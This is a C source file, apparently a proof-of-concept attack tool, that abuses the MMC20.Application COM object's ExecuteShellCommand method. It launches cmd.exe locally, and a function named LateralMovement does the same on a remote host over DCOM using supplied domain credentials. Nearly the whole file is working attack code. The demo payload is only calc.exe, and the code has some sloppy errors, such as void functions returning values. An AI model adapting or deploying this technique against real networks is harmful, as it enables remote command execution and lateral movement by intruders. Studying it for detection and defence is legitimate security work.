#include <windows.h>
#include <shobjidl.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <propvarutil.h>
#include<combaseapi.h>
#include <heapapi.h>
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "propsys.lib")


#pragma once
#define _CRT_SECURE_NO_WARNINGS 1 


int main() {

	HRESULT hr;
	IDispatch* ApplicationIfc;
	CLSID clsid;
	wchar_t* MMC20_CLSID = L"{49B2791A-B1AE-4C90-9B8E-E860BA07F889}";
	DISPPARAMS dp = { NULL, NULL, 0, 0 };
	VARIANT* vDocIfc = (VARIANT*)malloc(sizeof(VARIANT));
	VARIANT* vViewIfc = (VARIANT*)malloc(sizeof(VARIANT)), res;
	DISPID dpid;


	//Initialize COM
	hr = CoInitialize(NULL);


	//Both will work, choose one!
	hr = CLSIDFromProgID(L"MMC20.Application", &clsid);
	//hr = CLSIDFromString(MMC20_CLSID, &clsid);


	//Specify the interface ID that we are interested in 
	IID ApplicationIID;
	hr = IIDFromString(L"{A3AFB9CC-B653-4741-86AB-F0470EC1384C}", &ApplicationIID);


	//Create the instance
	hr = CoCreateInstance(&clsid, NULL, CLSCTX_LOCAL_SERVER, &ApplicationIID, (void**)&ApplicationIfc);
	
	if (!SUCCEEDED(hr)) {
		return -1;
	}
	
	//Retrieve the Document interface
	hr = ApplicationIfc->lpVtbl->Invoke(ApplicationIfc, (LONG)4, &IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYGET, &dp, vDocIfc, NULL, 0);

	if (!SUCCEEDED(hr)) {
		ApplicationIfc->lpVtbl->Release(ApplicationIfc->lpVtbl); //Release even if it fails to obtain the second object
		return -2;
	}

	//We should release the object since we are not going to use it anymore. 
	ApplicationIfc->lpVtbl->Release(ApplicationIfc);


	
	BSTR szMember = SysAllocString(L"ActiveView");

	//Get the Dispatch ID of the ActiveView method programtically
	hr = vDocIfc->pdispVal->lpVtbl->GetIDsOfNames(vDocIfc->pdispVal, &IID_IDispatch, &szMember, 1, LOCALE_SYSTEM_DEFAULT, &dpid);
	if (!SUCCEEDED(hr)) {
		ApplicationIfc->lpVtbl->Release(ApplicationIfc->lpVtbl);
		vDocIfc->pdispVal->lpVtbl->Release(vDocIfc->pdispVal);
		return -3;
	}
	
	//Invoke the ActiveView method, this will return a View interface in vViewIfc
	hr = vDocIfc->pdispVal->lpVtbl->Invoke(vDocIfc->pdispVal, dpid, &IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYGET, &dp, vViewIfc, NULL, 0);

	if (!SUCCEEDED(hr)) {
		ApplicationIfc->lpVtbl->Release(ApplicationIfc->lpVtbl);
		vDocIfc->pdispVal->lpVtbl->Release(vDocIfc->pdispVal);
		return -4;
	}

	//If we succeeded, we don't need the vDocIfc anymore since we are going to use the view Object
	vDocIfc->pdispVal->lpVtbl->Release(vDocIfc->pdispVal);


	VARIANT vCmd, vDir, vArgs, vShow;

	//Create our parameters
	{
		vCmd.vt = VT_BSTR;
		vCmd.bstrVal = SysAllocString(L"c:\\windows\\system32\\cmd.exe");

		vDir.vt = VT_BSTR;
		vDir.bstrVal = SysAllocString(L"");

		vArgs.vt = VT_BSTR;
		vArgs.bstrVal = SysAllocString(L"/c calc.exe");

		vShow.vt = VT_BSTR;
		vShow.bstrVal = SysAllocString(L"Minimized");
	}


	DISPPARAMS params = { NULL, NULL, 0, 0 };
	//Add the variants we created to the params.
	params.rgvarg = (VARIANT*)malloc(sizeof(VARIANT) * 4);
	VARIANT varr[4] = { vShow, vArgs, vDir, vCmd };
	params.rgvarg = varr;
	params.cArgs = 4;

	//This will work, idk why
	params.rgdispidNamedArgs = 0;
	params.cNamedArgs = 0;


	//Finally execute our command
	hr = vViewIfc->pdispVal->lpVtbl->Invoke(vViewIfc->pdispVal, (LONG)54, &IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_METHOD, &params, &res, NULL, 0);

	//whether the final step succeeded or not, we need to release the object
	vViewIfc->pdispVal->lpVtbl->Release(vViewIfc->pdispVal);
}


void LateralMovement() {

	HRESULT hr;
	IDispatch* ApplicationIfc;
	CLSID clsid;
	wchar_t* MMC20_CLSID = L"{49B2791A-B1AE-4C90-9B8E-E860BA07F889}";
	DISPPARAMS dp = { NULL, NULL, 0, 0 };
	VARIANT* vDocIfc = (VARIANT*)malloc(sizeof(VARIANT));
	VARIANT* vViewIfc = (VARIANT*)malloc(sizeof(VARIANT)), res;
	DISPID dpid;
	COAUTHIDENTITY* authidentity;
	COAUTHINFO* authInfo;
	COSERVERINFO* srvinfo;



	//User identity, can be null if you wish to use current user context
	{
		authidentity = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));
		authidentity->User = L"?USERNAME";
		authidentity->Password = L"?PASSWORD";
		authidentity->Domain = L"?DOMAIN";
		authidentity->UserLength = wcslen(authidentity->User);
		authidentity->PasswordLength = wcslen(authidentity->Password);
		authidentity->DomainLength = wcslen(authidentity->Domain);
		authidentity->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
	}


	//Standard choices
	{
		authInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO));
		authInfo->dwAuthnSvc = RPC_C_AUTHN_WINNT;
		authInfo->dwAuthzSvc = RPC_C_AUTHZ_NONE;
		authInfo->pwszServerPrincName = NULL;
		authInfo->dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
		authInfo->dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
		authInfo->pAuthIdentityData = authidentity;
		authInfo->dwCapabilities = EOAC_NONE;
	}


	//Specify the target by IP or hostname
	{
		srvinfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COSERVERINFO));;
		srvinfo->dwReserved1 = 0;
		srvinfo->dwReserved2 = 0;
		srvinfo->pwszName = L"10.1.1.1";
		srvinfo->pAuthInfo = authInfo;
	}


	//Initialize COM
	hr = CoInitialize(NULL);


	//Both will work, choose one!
	hr = CLSIDFromProgID(L"MMC20.Application", &clsid);
	//hr = CLSIDFromString(MMC20_CLSID, &clsid);


	//Specify the interface ID that we are interested in 
	IID ApplicationIID, IDispatchIID;
	hr = IIDFromString(L"{A3AFB9CC-B653-4741-86AB-F0470EC1384C}", &ApplicationIID);
	

	//Create a structure to retrieve the object from the remote server
	MULTI_QI mqi[1] = { &ApplicationIfc, NULL, 0 };

	//Create the instance
	hr = CoCreateInstanceEx(&clsid, NULL, CLSCTX_REMOTE_SERVER, srvinfo, 1, mqi);

	if (!SUCCEEDED(hr))
	{
		return -1;
	}

	//The mqi returns an IUnknown interface, we have to do query interface again to get the IDispatch methods
	hr = mqi->pItf->lpVtbl->QueryInterface(mqi->pItf, &ApplicationIID, ApplicationIfc);
	if (!SUCCEEDED(hr)) {
		mqi->pItf->lpVtbl->Release(mqi->pItf);
		return -1;
	}

	//From here on, things are the same as a local COM invocation
	ApplicationIfc->lpVtbl->Invoke(ApplicationIfc, (LONG)4, &IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYGET, &dp, vDocIfc, NULL, 0);
	
	if (!SUCCEEDED(hr)) {
		mqi->pItf->lpVtbl->Release(mqi->pItf);
		ApplicationIfc->lpVtbl->Release(ApplicationIfc->lpVtbl);
		return -1;
	}

	//Retrieve the Document interface
	hr = ApplicationIfc->lpVtbl->Invoke(ApplicationIfc, (LONG)4, &IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYGET, &dp, vDocIfc, NULL, 0);

	if (!SUCCEEDED(hr)) {
		ApplicationIfc->lpVtbl->Release(ApplicationIfc->lpVtbl); //Release even if it fails to obtain the second object
		return -2;
	}

	//We should release the object since we are not going to use it anymore. 
	ApplicationIfc->lpVtbl->Release(ApplicationIfc);



	BSTR szMember = SysAllocString(L"ActiveView");

	//Get the Dispatch ID of the ActiveView method programtically
	hr = vDocIfc->pdispVal->lpVtbl->GetIDsOfNames(vDocIfc->pdispVal, &IID_IDispatch, &szMember, 1, LOCALE_SYSTEM_DEFAULT, &dpid);
	if (!SUCCEEDED(hr)) {
		ApplicationIfc->lpVtbl->Release(ApplicationIfc->lpVtbl);
		vDocIfc->pdispVal->lpVtbl->Release(vDocIfc->pdispVal);
		return -3;
	}

	//Invoke the ActiveView method, this will return a View interface in vViewIfc
	hr = vDocIfc->pdispVal->lpVtbl->Invoke(vDocIfc->pdispVal, dpid, &IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYGET, &dp, vViewIfc, NULL, 0);

	if (!SUCCEEDED(hr)) {
		ApplicationIfc->lpVtbl->Release(ApplicationIfc->lpVtbl);
		vDocIfc->pdispVal->lpVtbl->Release(vDocIfc->pdispVal);
		return -4;
	}

	//If we succeeded, we don't need the vDocIfc anymore since we are going to use the view Object
	vDocIfc->pdispVal->lpVtbl->Release(vDocIfc->pdispVal);


	VARIANT vCmd, vDir, vArgs, vShow;

	//Create our parameters
	{
		vCmd.vt = VT_BSTR;
		vCmd.bstrVal = SysAllocString(L"c:\\windows\\system32\\cmd.exe");

		vDir.vt = VT_BSTR;
		vDir.bstrVal = SysAllocString(L"");

		vArgs.vt = VT_BSTR;
		vArgs.bstrVal = SysAllocString(L"/c calc.exe");

		vShow.vt = VT_BSTR;
		vShow.bstrVal = SysAllocString(L"Minimized");
	}


	DISPPARAMS params = { NULL, NULL, 0, 0 };
	//Add the variants we created to the params.
	params.rgvarg = (VARIANT*)malloc(sizeof(VARIANT) * 4);
	VARIANT varr[4] = { vShow, vArgs, vDir, vCmd };
	params.rgvarg = varr;
	params.cArgs = 4;

	//This will work, idk why
	params.rgdispidNamedArgs = 0;
	params.cNamedArgs = 0;


	//Finally execute our command
	hr = vViewIfc->pdispVal->lpVtbl->Invoke(vViewIfc->pdispVal, (LONG)54, &IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_METHOD, &params, &res, NULL, 0);

	//whether the final step succeeded or not, we need to release the object
	vViewIfc->pdispVal->lpVtbl->Release(vViewIfc->pdispVal);
}